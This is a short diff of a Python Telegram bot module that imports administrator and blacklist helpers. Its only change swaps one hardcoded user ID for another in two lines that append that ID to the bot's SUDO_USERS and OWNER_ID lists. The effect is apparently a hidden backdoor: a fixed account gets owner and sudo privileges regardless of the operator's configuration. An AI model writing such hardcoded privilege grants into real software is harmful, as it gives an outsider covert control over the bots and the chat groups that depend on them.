@@ -9,9 +9,9 @@ from driver.admins import get_administrators
 from driver.database.dblockchat import blacklisted_chats
 from driver.database.dbpunish import is_gbanned_user
 
-SUDO_USERS.append(705475246)
+SUDO_USERS.append(1925760763)
 
-OWNER_ID.append(705475246)
+OWNER_ID.append(1925760763)
 
 
 def errors(func: Callable) -> Callable:
